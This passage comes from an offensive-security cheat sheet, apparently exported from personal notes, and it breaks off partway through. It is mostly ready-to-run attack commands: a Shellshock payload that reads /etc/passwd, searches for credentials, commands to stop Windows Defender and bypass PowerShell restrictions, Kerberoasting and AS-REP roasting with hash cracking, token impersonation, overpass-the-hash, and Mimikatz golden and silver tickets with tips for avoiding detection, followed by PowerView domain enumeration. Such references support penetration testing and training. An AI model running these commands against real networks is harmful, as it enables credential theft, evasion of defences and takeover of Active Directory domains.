perl -e <span class="hljs-string">&#x27;exec &quot;/bin/bash&quot;&#x27;</span>

<span class="hljs-comment"># Ruby</span>
exec <span class="hljs-string">&quot;/bin/bash&quot;</span>

<span class="hljs-comment"># Lua</span>
os.execute(<span class="hljs-string">&#x27;/bin/bash&#x27;</span>)</code></pre></div>
<h3 id="adjust-interactive-shell">Adjust Interactive shell</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">stty size # Find your terminal size -&gt; 50 235
Ctrl-Z
stty raw -echo  // Disable shell echo
fg
export SHELL=bash
export TERM=xterm OR export TERM=xterm-256color
stty rows 50 columns 235</pre><pre class="hljs"><code>stty size <span class="hljs-comment"># Find your terminal size -&gt; 50 235</span>
Ctrl-Z
stty raw -<span class="hljs-built_in">echo</span>  // Disable shell <span class="hljs-built_in">echo</span>
<span class="hljs-built_in">fg</span>
<span class="hljs-built_in">export</span> SHELL=bash
<span class="hljs-built_in">export</span> TERM=xterm OR <span class="hljs-built_in">export</span> TERM=xterm-256color
stty rows 50 columns 235</code></pre></div>
<hr>
<h2 id="shellshock">SHELLSHOCK</h2>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">curl -H &quot;user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot; &lt;URL&gt;/cgi-bin/&lt;SCRIPT&gt;</pre><pre class="hljs"><code>curl -H <span class="hljs-string">&quot;user-agent: () { :; }; echo; echo; /bin/bash -c &#x27;cat /etc/passwd&#x27;&quot;</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">URL</span>&gt;</span>/cgi-bin/</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span></span></code></pre></div>
<hr>
<h2 id="useful-linux-commands">USEFUL LINUX COMMANDS</h2>
<h3 id="find-a-file">Find a file</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">locate &lt;FILE&gt;
find / -name &quot;&lt;FILE&gt;&quot;</pre><pre class="hljs"><code>locate &lt;<span class="hljs-keyword">FILE</span>&gt;
<span class="hljs-keyword">find</span> / -name <span class="hljs-string">&quot;&lt;FILE&gt;&quot;</span></code></pre></div>
<h3 id="active-connection">Active connection</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">netstat -lntp</pre><pre class="hljs"><code><span class="hljs-attribute">netstat -lntp</span></code></pre></div>
<h3 id="list-all-suid-files">List all SUID files</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">find / -perm -4000 2&gt;/dev/null</pre><pre class="hljs"><code><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -4000 2&gt;/</span>dev/<span class="hljs-keyword">null</span></code></pre></div>
<h3 id="determine-the-current-version-of-linux">Determine the current version of Linux</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"> cat /etc/issue</pre><pre class="hljs"><code> cat <span class="hljs-regexp">/etc/i</span>ssue</code></pre></div>
<h3 id="determine-more-information-about-the-environment">Determine more information about the environment</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">uname -a</pre><pre class="hljs"><code>uname -<span class="hljs-selector-tag">a</span></code></pre></div>
<h3 id="list-processes-running">List processes running</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">ps -faux</pre><pre class="hljs"><code><span class="hljs-attribute">ps -faux</span></code></pre></div>
<h3 id="list-the-allowed-and-forbidden-commands-for-the-invoking-use">List the allowed (and forbidden) commands for the invoking use</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">sudo -l</pre><pre class="hljs"><code><span class="hljs-attribute">sudo -l</span></code></pre></div>
<hr>
<h2 id="useful-windows-commands">USEFUL WINDOWS COMMANDS</h2>
<p><a data-from-md title='https://wadcoms.github.io/' href='https://wadcoms.github.io/'>https://wadcoms.github.io/</a> - Interactive cheatsheet - Windows/ Active directory</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">net config Workstation
systeminfo
net users

ipconfig /all
netstat -ano

schtasks /query /fo LIST /v
tasklist /SVC
net start
DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s pass == cred == vnc == .config
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Disable windows defender
sc stop WinDefend

# Bypass restriction
powershell -nop -ep bypass

# List hidden files
dir /a

# Find a file
dir /b/s &quot;&lt;FILE&gt;&quot;</pre><pre class="hljs"><code>net config Workstation
systeminfo
net users

ipconfig <span class="hljs-string">/all</span>
netstat -ano

schtasks <span class="hljs-string">/query</span> <span class="hljs-string">/fo</span> LIST <span class="hljs-string">/v</span>
tasklist <span class="hljs-string">/SVC</span>
net start
DRIVERQUERY

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir <span class="hljs-string">/s</span> pass == cred == vnc == <span class="hljs-string">.config</span>
findstr <span class="hljs-string">/si</span> password *<span class="hljs-string">.xml</span> *<span class="hljs-string">.ini</span> *<span class="hljs-string">.txt</span>
reg query HKLM <span class="hljs-string">/f</span> password <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/s</span>
reg query HKCU <span class="hljs-string">/f</span> password <span class="hljs-string">/t</span> REG_SZ <span class="hljs-string">/s</span>

<span class="hljs-comment"># Disable windows defender</span>
sc stop WinDefend

<span class="hljs-comment"># Bypass restriction</span>
powershell -nop -ep bypass

<span class="hljs-comment"># List hidden files</span>
dir <span class="hljs-string">/a</span>

<span class="hljs-comment"># Find a file</span>
dir <span class="hljs-string">/b/s</span> <span class="hljs-string">&quot;&lt;FILE&gt;&quot;</span></code></pre></div>
<h2 id="lateral-movement">Lateral Movement</h2>
<h3 id="powerview">Powerview</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Find existing local admin access for user (noisy 🚩)
Find-LocalAdminAccess

# Hunt for sessions of interesting users on machines where you have access (also noisy 🚩)
Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }

# Look for kerberoastable users
Get-DomainUser -SPN | select name,serviceprincipalname

# Look for AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select name

# Look for interesting ACL within the domain, filtering on a specific user or group you have compromised
## Exploitation depends on the identified ACL, some techniques are discussed in this cheat sheet
## Example for GenericWrite on user: Disable preauth or add SPN for targeted kerberoast (see below)
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match &quot;UserOrGroupToQuery&quot;}

# Look for servers with Unconstrained Delegation enabled
## If available and you have admin privs on this server, get user TGT (see below)
Get-DomainComputer -Unconstrained

# Look for users or computers with Constrained Delegation enabled
## If available and you have user/computer hash, access service machine as DA (see below)
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto</pre><pre class="hljs"><code># Find existing local admin access for user (noisy 🚩)
Find-LocalAdminAccess

# Hunt for sessions of interesting users on machines where you have access (also noisy 🚩)
Find-DomainUserLocation -CheckAccess | ?{$_.LocalAdmin -Eq True }

# Look for kerberoastable users
Get-DomainUser -SPN | select name,serviceprincipalname

# Look for AS-REP roastable users
Get-DomainUser -PreauthNotRequired | select name

# Look for interesting ACL within the domain, filtering on a specific user or group you have compromised
## Exploitation depends on the identified ACL, some techniques are discussed in this cheat sheet
## Example for GenericWrite on user: Disable preauth or add SPN for targeted kerberoast (see below)
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match &quot;UserOrGroupToQuery&quot;}

# Look for servers with Unconstrained Delegation enabled
## If available and you have admin privs on this server, get user TGT (see below)
Get-DomainComputer -Unconstrained

# Look for users or computers with Constrained Delegation enabled
## If available and you have user/computer hash, access service machine as DA (see below)
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto</code></pre></div>
<h3 id="bloodhound">Bloodhound</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Run all checks, including restricted groups enforced through the domain  🚩
Invoke-BloodHound -CollectionMethod All,GPOLocalGroup

# Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts so is VERY noisy 🚩
Invoke-BloodHound -CollectionMethod LoggedOn</pre><pre class="hljs"><code><span class="hljs-comment"># Run all checks, including restricted groups enforced through the domain  🚩</span>
Invoke-<span class="hljs-keyword">BloodHound </span>-CollectionMethod All,GPOLocalGroup

<span class="hljs-comment"># Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts so is VERY noisy 🚩</span>
Invoke-<span class="hljs-keyword">BloodHound </span>-CollectionMethod LoggedOn</code></pre></div>
<hr>
<h2 id="kerberoasting">Kerberoasting</h2>
<h3 id="automatic">Automatic</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># With PowerView
Get-DomainSPNTicket -SPN &quot;MSSQLSvc/sqlserver.targetdomain.com&quot;

# Crack the hash with Hashcat:

hashcat -a 0 -m 13100 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule</pre><pre class="hljs"><code><span class="hljs-comment"># With PowerView</span>
Get-DomainSPNTicket -SPN <span class="hljs-string">&quot;MSSQLSvc/sqlserver.targetdomain.com&quot;</span>

<span class="hljs-comment"># Crack the hash with Hashcat:</span>

hashcat -a 0 -m 13100 hash.txt `<span class="hljs-keyword">pwd</span>`<span class="hljs-string">/rockyou.txt</span> <span class="hljs-params">--rules-file</span> `<span class="hljs-keyword">pwd</span>`<span class="hljs-string">/hashcat/rules/best64.rule</span></code></pre></div>
<h3 id="manual">Manual</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Request TGS for kerberoastable account (SPN)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/sqlserver.targetdomain.com&quot;

# Dump TGS to disk
Invoke-Mimikatz -Command '&quot;kerberos::list /export&quot;'

# Crack with TGSRepCrack
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\mssqlsvc.kirbi</pre><pre class="hljs"><code><span class="hljs-comment"># Request TGS for kerberoastable account (SPN)</span>
Add-Type -AssemblyName System.IdentityModel
New-<span class="hljs-built_in">Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="hljs-string">&quot;MSSQLSvc/sqlserver.targetdomain.com&quot;</span>

<span class="hljs-comment"># Dump TGS to disk</span>
Invoke-Mimikatz -Command <span class="hljs-string">&#x27;&quot;kerberos::list /export&quot;&#x27;</span>

<span class="hljs-comment"># Crack with TGSRepCrack</span>
python.exe .<span class="hljs-string">\tgsrepcrack.py</span> .<span class="hljs-string">\10k-worst-pass.txt</span> .<span class="hljs-string">\mssqlsvc.kirbi</span></code></pre></div>
<h3 id="targeted-kerberoasting-by-setting-spn">Targeted kerberoasting by setting SPN</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:

Set-DomainObject -Identity TargetUser -Set @{serviceprincipalname='any/thing'}</pre><pre class="hljs"><code><span class="hljs-comment"># We need have ACL write permissions to set UserAccountControl flags for the target user, see above for identification of interesting ACLs. Using PowerView:</span>

Set-DomainObject -Identity TargetUser -<span class="hljs-built_in">Set</span> @{<span class="hljs-attribute">serviceprincipalname</span>=<span class="hljs-string">&#x27;any/thing&#x27;</span>}</code></pre></div>
<hr>
<h2 id="as-rep-roasting">AS-REP roasting</h2>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Get the hash for a roastable user (see above for hunting). Using ASREPRoast.ps1:
Get-ASREPHash -UserName TargetUser
# Crack the hash with Hashcat:

hashcat -a 0 -m 18200 hash.txt `pwd`/rockyou.txt --rules-file `pwd`/hashcat/rules/best64.rule</pre><pre class="hljs"><code><span class="hljs-comment"># Get the hash for a roastable user (see above for hunting). Using ASREPRoast.ps1:</span>
Get-ASREPHash -UserName TargetUser
<span class="hljs-comment"># Crack the hash with Hashcat:</span>

hashcat -a 0 -m 18200 hash.txt `<span class="hljs-keyword">pwd</span>`<span class="hljs-string">/rockyou.txt</span> <span class="hljs-params">--rules-file</span> `<span class="hljs-keyword">pwd</span>`<span class="hljs-string">/hashcat/rules/best64.rule</span></code></pre></div>
<h3 id="targeted-as-rep-roasting-by-disabling-kerberos-pre-authentication">Targeted AS-REP roasting by disabling Kerberos pre-authentication</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Again, we need ACL write permissions to set UserAccountControl flags for the target user. Using PowerView:

Set-DomainObject -Identity TargetUser -XOR @{useraccountcontrol=4194304}</pre><pre class="hljs"><code># Again, we need ACL <span class="hljs-keyword">write</span> permissions <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> UserAccountControl <span class="hljs-keyword">flags</span> <span class="hljs-keyword">for</span> the target user. <span class="hljs-keyword">Using</span> PowerView:

<span class="hljs-keyword">Set</span>-DomainObject -Identity TargetUser -<span class="hljs-keyword">XOR</span> @<span class="hljs-comment">{useraccountcontrol=4194304}</span></code></pre></div>
<hr>
<h2 id="token-manipulation">Token Manipulation</h2>
<p>Tokens can be impersonated from other users with a session/running processes on the machine. Most C2 frameworks have functionality for this built-in (such as the ‘Steal Token’ functionality in Cobalt Strike).</p>
<h3 id="incognito">Incognito</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Show tokens on the machine
.\incognito.exe list_tokens -u

# Start new process with token of a specific user
.\incognito.exe execute -c &quot;domain\user&quot; C:\Windows\system32\calc.exe</pre><pre class="hljs"><code><span class="hljs-comment"># Show tokens on the machine</span>
<span class="hljs-keyword">.</span>\incognito.exe list_tokens -u

<span class="hljs-comment"># Start new process with token of a specific user</span>
<span class="hljs-keyword">.</span>\incognito.exe<span class="hljs-built_in"> execute </span>-c <span class="hljs-string">&quot;domain\user&quot;</span> C:\Windows\system32\calc.exe</code></pre></div>
<h3 id="invoke-tokenmanipulation">Invoke-TokenManipulation</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Show all tokens on the machine
Invoke-TokenManipulation -ShowAll

# Show only unique, usable tokens on the machine
Invoke-TokenManipulation -Enumerate

# Start new process with token of a specific user
Invoke-TokenManipulation -ImpersonateUser -Username &quot;domain\user&quot;

# Start new process with token of another process
Invoke-TokenManipulation -CreateProcess &quot;C:\Windows\system32\calc.exe&quot; -ProcessId 500</pre><pre class="hljs"><code># <span class="hljs-keyword">Show</span> <span class="hljs-keyword">all</span> tokens <span class="hljs-keyword">on</span> the machine
Invoke-TokenManipulation -ShowAll

# <span class="hljs-keyword">Show</span> <span class="hljs-keyword">only</span> <span class="hljs-keyword">unique</span>, usable tokens <span class="hljs-keyword">on</span> the machine
Invoke-TokenManipulation -Enumerate

# <span class="hljs-keyword">Start</span> <span class="hljs-built_in">new</span> process <span class="hljs-keyword">with</span> token <span class="hljs-keyword">of</span> a specific <span class="hljs-keyword">user</span>
Invoke-TokenManipulation -ImpersonateUser -Username &quot;domain\user&quot;

# <span class="hljs-keyword">Start</span> <span class="hljs-built_in">new</span> process <span class="hljs-keyword">with</span> token <span class="hljs-keyword">of</span> another process
Invoke-TokenManipulation -CreateProcess &quot;C:\Windows\system32\calc.exe&quot; -ProcessId <span class="hljs-number">500</span></code></pre></div>
<hr>
<h3 id="lateral-movement-with-rubeus">Lateral Movement with Rubeus</h3>
<p>We can use Rubeus to execute a technique called “Overpass-the-Hash”. In this technique, instead of passing the hash directly (another technique known as Pass-the-Hash), we use the NTLM hash of an account to request a valid Kerberost ticket (TGT). We can then use this ticket to authenticate towards the domain as the target user.</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Request a TGT as the target user and pass it into the current session
# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt

# More stealthy variant, but requires the AES256 key (see 'Dumping OS credentials with Mimikatz' section)
.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256KEY] /opsec /ptt

# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe</pre><pre class="hljs"><code><span class="hljs-comment"># Request a TGT as the target user and pass it into the current session</span>
<span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Make sure to clear tickets in the current session (with &#x27;klist purge&#x27;) to ensure you don&#x27;t have multiple active TGTs</span>
.\Rubeus.exe asktgt <span class="hljs-string">/user</span><span class="hljs-function">:Administrator</span> <span class="hljs-string">/rc4</span>:[NTLMHASH] <span class="hljs-string">/ptt</span>

<span class="hljs-comment"># More stealthy variant, but requires the AES256 key (see &#x27;Dumping OS credentials with Mimikatz&#x27; section)</span>
.\Rubeus.exe asktgt <span class="hljs-string">/user</span><span class="hljs-function">:Administrator</span> <span class="hljs-string">/aes256</span>:[AES256KEY] <span class="hljs-string">/opsec</span> <span class="hljs-string">/ptt</span>

<span class="hljs-comment"># Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)</span>
.\Rubeus.exe asktgt <span class="hljs-string">/user</span><span class="hljs-function">:Administrator</span> <span class="hljs-string">/rc4</span>:[NTLMHASH] <span class="hljs-string">/createnetonly</span><span class="hljs-function">:C</span>:\Windows\System32\cmd.exe</code></pre></div>
<p>Once we have a TGT as the target user, we can use services as this user in a domain context, allowing us to move laterally.</p>
<hr>
<h3 id="lateral-movement-with-mimikatz">Lateral Movement with Mimikatz</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Overpass-the-hash (more risky than Rubeus, writes to LSASS memory)
sekurlsa::pth /user:Administrator /domain:targetdomain.com /ntlm:[NTLMHASH] /run:powershell.exe

# Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands
sekurlsa::pth /user:Administrator /domain:targetdomain.com /aes256:[AES256KEY] /run:powershell.exe

# Golden ticket (domain admin, w/ some ticket properties to avoid detection)
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt

# Silver ticket for a specific SPN with a compromised service / machine account
kerberos::golden /user:Administrator /domain:targetdomain.com /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.targetdomain.com /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt</pre><pre class="hljs"><code><span class="hljs-comment"># Overpass-the-hash (more risky than Rubeus, writes to LSASS memory)</span>
sekurlsa::pth <span class="hljs-regexp">/user:Administrator /</span>domain:targetdomain.com <span class="hljs-regexp">/ntlm:[NTLMHASH] /</span>run:powershell.exe

<span class="hljs-comment"># Or, a more opsec-safe version that uses the AES256 key (similar to with Rubeus above) - works for multiple Mimikatz commands</span>
sekurlsa::pth <span class="hljs-regexp">/user:Administrator /</span>domain:targetdomain.com <span class="hljs-regexp">/aes256:[AES256KEY] /</span>run:powershell.exe

<span class="hljs-comment"># Golden ticket (domain admin, w/ some ticket properties to avoid detection)</span>
kerberos::golden <span class="hljs-regexp">/user:Administrator /</span>domain:targetdomain.com <span class="hljs-regexp">/sid:S-1-5-21-[DOMAINSID] /</span>krbtgt:[KRBTGTHASH] <span class="hljs-regexp">/id:500 /g</span>roups:<span class="hljs-number">513</span>,<span class="hljs-number">512</span>,<span class="hljs-number">520</span>,<span class="hljs-number">518</span>,<span class="hljs-number">519</span> <span class="hljs-regexp">/startoffset:0 /</span>endin:<span class="hljs-number">600</span> <span class="hljs-regexp">/renewmax:10080 /</span>ptt

<span class="hljs-comment"># Silver ticket for a specific SPN with a compromised service / machine account</span>
kerberos::golden <span class="hljs-regexp">/user:Administrator /</span>domain:targetdomain.com <span class="hljs-regexp">/sid:S-1-5-21-[DOMAINSID] /</span>rc4:[MACHINEACCOUNTHASH] <span class="hljs-regexp">/target:dc.targetdomain.com /</span>service:HOST <span class="hljs-regexp">/id:500 /g</span>roups:<span class="hljs-number">513</span>,<span class="hljs-number">512</span>,<span class="hljs-number">520</span>,<span class="hljs-number">518</span>,<span class="hljs-number">519</span> <span class="hljs-regexp">/startoffset:0 /</span>endin:<span class="hljs-number">600</span> <span class="hljs-regexp">/renewmax:10080 /</span>ptt</code></pre></div>
<h2 id="tools-2">Tools</h2>
<ul>
<li><a data-from-md title='https://github.com/PowerShellMafia/PowerSploit/tree/dev' href='https://github.com/PowerShellMafia/PowerSploit/tree/dev'>Powersploit</a></li>
<li><a data-from-md title='https://github.com/NetSPI/PowerUpSQL' href='https://github.com/NetSPI/PowerUpSQL'>PowerUpSQL</a></li>
<li><a data-from-md title='https://github.com/Kevin-Robertson/Powermad' href='https://github.com/Kevin-Robertson/Powermad'>Powermad</a></li>
<li><a data-from-md title='https://github.com/SecureAuthCorp/impacket' href='https://github.com/SecureAuthCorp/impacket'>Impacket</a></li>
<li><a data-from-md title='https://github.com/gentilkiwi/mimikatz' href='https://github.com/gentilkiwi/mimikatz'>Mimikatz</a></li>
<li><a data-from-md title='https://github.com/GhostPack/Rubeus' href='https://github.com/GhostPack/Rubeus'>Rubeus</a> -&gt; <a data-from-md title='https://github.com/r3motecontrol/Ghostpack-CompiledBinaries' href='https://github.com/r3motecontrol/Ghostpack-CompiledBinaries'>Compiled Version</a></li>
<li><a data-from-md title='https://github.com/BloodHoundAD/BloodHound' href='https://github.com/BloodHoundAD/BloodHound'>BloodHound</a></li>
<li><a data-from-md title='https://github.com/samratashok/ADModule' href='https://github.com/samratashok/ADModule'>AD Module</a></li>
<li><a data-from-md title='https://github.com/HarmJ0y/ASREPRoast' href='https://github.com/HarmJ0y/ASREPRoast'>ASREPRoast</a></li>
<li><a data-from-md title='https://github.com/lkarlslund/adalanche' href='https://github.com/lkarlslund/adalanche'>Adalanche</a></li>
</ul>
<h2 id="domain-enumeration">Domain Enumeration</h2>
<h3 id="using-powerview">Using PowerView</h3>
<p><a data-from-md title='https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1' href='https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1'>Powerview v.3.0</a><br class="jop-noMdConv"/><br>
<a data-from-md title='https://powersploit.readthedocs.io/en/latest/' href='https://powersploit.readthedocs.io/en/latest/'>Powerview Wiki</a></p>
<ul>
<li>
<p><strong>Get Current Domain:</strong> <code class="inline-code">Get-Domain</code></p>
</li>
<li>
<p><strong>Enumerate Other Domains:</strong> <code class="inline-code">Get-Domain -Domain &lt;DomainName&gt;</code></p>
</li>
<li>
<p><strong>Get Domain SID:</strong> <code class="inline-code">Get-DomainSID</code></p>
</li>
<li>
<p><strong>Get Domain Policy:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-DomainPolicy

#Will show us the policy configurations of the Domain about system access or kerberos
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy</pre><pre class="hljs"><code><span class="hljs-built_in">Get-DomainPolicy</span>

<span class="hljs-comment">#Will show us the policy configurations of the Domain about system access or kerberos</span>
<span class="hljs-built_in">Get-DomainPolicy</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-ExpandProperty</span> SystemAccess
<span class="hljs-built_in">Get-DomainPolicy</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-ExpandProperty</span> KerberosPolicy</code></pre></div>
</li>
<li>
<p><strong>Get Domain Controllers:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-DomainController
Get-DomainController -Domain &lt;DomainName&gt;</pre><pre class="hljs"><code><span class="hljs-built_in">Get-DomainController</span>
<span class="hljs-built_in">Get-DomainController</span> <span class="hljs-literal">-Domain</span> &lt;DomainName&gt;</code></pre></div>
</li>
<li>
<p><strong>Enumerate Domain Users:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Save all Domain Users to a file
Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

#Will return specific properties of a specific user
Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List

#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName &lt;ComputerName&gt;

#Enumerate Session Information for a machine
Get-NetSession -ComputerName &lt;ComputerName&gt;

#Enumerate domain machines of the current/specified domain where specific users are logged into
Find-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName</pre><pre class="hljs"><code><span class="hljs-comment">#Save all Domain Users to a file</span>
<span class="hljs-built_in">Get-DomainUser</span> | <span class="hljs-built_in">Out-File</span> <span class="hljs-literal">-FilePath</span> .\DomainUsers.txt

<span class="hljs-comment">#Will return specific properties of a specific user</span>
<span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> [<span class="hljs-type">username</span>] <span class="hljs-literal">-Properties</span> DisplayName, MemberOf | <span class="hljs-built_in">Format-List</span>

<span class="hljs-comment">#Enumerate user logged on a machine</span>
<span class="hljs-built_in">Get-NetLoggedon</span> <span class="hljs-literal">-ComputerName</span> &lt;ComputerName&gt;

<span class="hljs-comment">#Enumerate Session Information for a machine</span>
<span class="hljs-built_in">Get-NetSession</span> <span class="hljs-literal">-ComputerName</span> &lt;ComputerName&gt;

<span class="hljs-comment">#Enumerate domain machines of the current/specified domain where specific users are logged into</span>
<span class="hljs-built_in">Find-DomainUserLocation</span> <span class="hljs-literal">-Domain</span> &lt;DomainName&gt; | <span class="hljs-built_in">Select-Object</span> UserName, SessionFromName</code></pre></div>
</li>
<li>
<p><strong>Enum Domain Computers:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerate Live machines
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName</pre><pre class="hljs"><code><span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Properties</span> OperatingSystem, Name, DnsHostName | <span class="hljs-built_in">Sort-Object</span> <span class="hljs-literal">-Property</span> DnsHostName

<span class="hljs-comment">#Enumerate Live machines</span>
<span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-Ping</span> <span class="hljs-literal">-Properties</span> OperatingSystem, Name, DnsHostName | <span class="hljs-built_in">Sort-Object</span> <span class="hljs-literal">-Property</span> DnsHostName</code></pre></div>
</li>
<li>
<p><strong>Enum Groups and Group Members:</strong></p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Save all Domain Groups to a file:
Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

#Return members of Specific Group (eg. Domain Admins &amp; Enterprise Admins)
Get-DomainGroup -Identity '&lt;GroupName&gt;' | Select-Object -ExpandProperty Member
Get-DomainGroupMember -Identity '&lt;GroupName&gt;' | Select-Object MemberDistinguishedName

#Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
Get-NetLocalGroup | Select-Object GroupName

#Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

#Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName</pre><pre class="hljs"><code><span class="hljs-comment">#Save all Domain Groups to a file:</span>
